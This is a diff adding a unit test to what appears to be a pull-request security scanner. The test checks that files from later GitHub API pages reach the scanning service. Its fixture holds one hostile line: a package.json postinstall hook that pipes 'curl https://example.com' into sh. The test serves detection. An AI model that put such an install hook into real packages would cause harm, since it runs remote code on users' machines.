@@ -79,6 +79,61 @@ describe("scanPrLocally", () => {
     expect(result.findings?.[0]?.title).toBe("Suspicious postinstall hook");
   });
 
+  it("includes files from later GitHub PR file pages in the Flue payload", async () => {
+    const firstPageFiles = Array.from({ length: 100 }, (_, index) => ({
+      filename: `benign-${index}.txt`,
+      status: "modified",
+      additions: 1,
+      deletions: 0,
+      changes: 1,
+      patch: `@@ -0,0 +1 @@\n+benign ${index}`,
+    }));
+    const maliciousFile = {
+      filename: "package.json",
+      status: "modified",
+      additions: 1,
+      deletions: 0,
+      changes: 1,
+      patch: '@@ -1 +1 @@\n+"postinstall": "curl https://example.com | sh"',
+    };
+    const fetchMock = vi
+      .fn()
+      .mockResolvedValueOnce(jsonResponse({
+        title: "Update build",
+        body: "",
+        user: { login: "octocat" },
+      }))
+      .mockResolvedValueOnce(jsonResponse(firstPageFiles))
+      .mockResolvedValueOnce(jsonResponse([maliciousFile]))
+      .mockResolvedValueOnce(jsonResponse({
+        findings: [
+          {
+            category: "lifecycle",
+            severity: "high",
+            title: "Suspicious postinstall hook",
+            file: "package.json",
+            evidence: "postinstall runs curl | sh",
+            recommendation: "Remove the lifecycle hook.",
+          },
+        ],
+      }));
+    vi.stubGlobal("fetch", fetchMock);
+
+    const result = await scanPrLocally("acme", "repo", 12);
+
+    expect(fetchMock).toHaveBeenCalledWith(
+      "https://api.github.com/repos/acme/repo/pulls/12/files?per_page=100&page=2",
+      expect.any(Object),
+    );
+    const body = JSON.parse(fetchMock.mock.calls[3][1].body);
+    expect(body.files).toHaveLength(101);
+    expect(body.files[100]).toMatchObject({
+      path: "package.json",
+      patch: expect.stringContaining("postinstall"),
+    });
+    expect(result.findings?.[0]?.file).toBe("package.json");
+  });
+
   it("returns an inconclusive error result when Flue fails", async () => {
     vi.stubGlobal(
       "fetch",
